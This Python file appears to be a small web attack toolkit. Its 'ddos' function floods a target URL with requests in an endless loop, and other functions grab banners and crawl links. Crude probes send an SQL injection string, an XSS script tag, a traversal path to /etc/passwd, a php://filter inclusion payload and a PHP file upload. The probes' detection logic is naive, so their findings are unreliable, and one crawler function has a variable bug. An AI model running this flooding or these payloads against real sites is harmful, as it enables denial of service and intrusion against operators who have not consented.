import socket
from rich import print as rprint
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import os
import json
import re
import requests

attack_num = 0

def grab_banner(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(b'HEAD / HTTP/1.1\r\n\r\n')
            banner = sock.recv(1024)
            return banner.decode().strip()
    except Exception:
        return "Unknown Service"

def ddos(method, url, payload, headers):
    while True:
        try:
            if method.upper() == 'GET':
                response = requests.get(url, params=payload, headers=headers)
                rprint(f"[bold green]Status Code: {response.status_code}[/bold green]")
                rprint(f"[white]{response.text}[/white]")
            elif method.upper() in ("POST", "PUT"):
                # Convert payload to JSON if it's a dictionary
                if isinstance(payload, dict):
                    payload = json.dumps(payload)
                response = requests.request(method.upper(), url, data=payload, headers=headers)
                rprint(f"[bold green]Status Code: {response.status_code}[/bold green]")
                rprint(f"[white]{response.text}[/white]")
            else:
                rprint(
                    f"[red][bold]Unsupported HTTP method: {method.upper()}[/bold][/red]"
                )

        except socket.gaierror as e:
            rprint(
                f"[bold red]Failed to resolve hostname {url}:[/bold red] {e}")
            break
        except Exception as e:
            rprint(f"[bold red]Error in DDoS attack:[/bold red] {e}")
            break


def discover_urls(url):
    discovered_urls = []

    # Send a GET request to the given URL
    response = requests.get(url)
    if response.status_code == 200:
        # Parse the HTML content of the response
        soup = BeautifulSoup(response.text, "html.parser")

        # Find all anchor tags and extract URLs
        for anchor_tag in soup.find_all("a"):
            href = anchor_tag.get("href")
            if href:
                absolute_url = urljoin(url, href)
                discovered_urls.append(absolute_url)

    return discovered_urls


def discover_dependencies(url):
    dependencies = []
    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")

        for scripts in soup.find_all("script"):
            src = scripts.get("src")
            if src:
                dependencies.append(src)

        for links in soup.find_all("link"):
            href = links.get("href")
            if src:
                dependencies.append(href)

    return dependencies


def check_vulnerabilities(url, sql, xss, conf, dirtv, rcev, fuv):
    if sql:
        rprint(
            f"[bold red]SQL injection: {is_sql_injection_vulnerable(url)}[/bold red]")
    if xss:
        rprint(f"[bold red]XSS: {is_xss_vulnerable(url)}[/bold red]")
    if conf:
        rprint(
            f"[bold red]Insecure configuration: {has_insecure_configuration(url)}[/bold red]")
    if dirtv:
        rprint(
            f"[bold red]Directory tranversal: {is_directory_traversal_vulnerable(url)}[/bold red]")
    if rcev:
        rprint(
            f"[bold red]Remote code execution: {is_remote_code_execution_vulnerable(url)}[/bold red]")
    if fuv:
        rprint(
            f"[bold red]File upload vulnerable: {is_file_upload_vulnerable(url)}[/bold red]")
    if not (sql or xss or conf or dirtv or rcev or fuv):
        rprint("[white bold]No vulnerabilities checked.[/white bold]")


def is_sql_injection_vulnerable(url):
    # Perform checks for SQL injection vulnerability
    # Example: Send a malicious SQL query and check the response
    payload = "' OR '1'='1"
    response = requests.get(url + "?id=" + payload)
    if re.search(r"error|warning", response.text, re.IGNORECASE):
        return True
    return False


def is_xss_vulnerable(url):
    # Perform checks for cross-site scripting (XSS) vulnerability
    # Example: Inject a script tag and check if it gets executed
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url + "?input=" + payload)
    if payload in response.text:
        return True
    return False


def has_insecure_configuration(url):
    # Perform checks for insecure server configuration
    # Example: Check if the website uses HTTP instead of HTTPS
    if not url.startswith("https"):
        return True
    return False


def is_directory_traversal_vulnerable(url):
    # Attempt to access a file outside of the web root directory
    test_path = "../../../../../../../../etc/passwd"
    response = requests.get(url + "/" + test_path)
    if "root:" in response.text:
        return True
    return False


def is_remote_code_execution_vulnerable(url):
    # Check if certain server-side functionality allows code execution
    # Example: If there's a PHP file inclusion vulnerability
    test_payload = "php://filter/convert.base64-encode/resource=index"
    response = requests.get(url + "?page=" + test_payload)
    if "base64" in response.text:
        return True
    return False


def is_file_upload_vulnerable(url):
    test_file_path = 'test.php'
    if os.path.exists(test_file_path):
        try:
            files = {'file': open(test_file_path, 'rb')}
            response = requests.post(url, files=files)
            if response.status_code == 200:
                return True
            else:
                return False
        except Exception as e:
            rprint(
                f"[bold red]Error occurred while testing file upload vulnerability: {e} [/bold red]")
            return False
    else:
        rprint(f"[bold red]Test file '{test_file_path}' not found.[/bold red]")
        return False
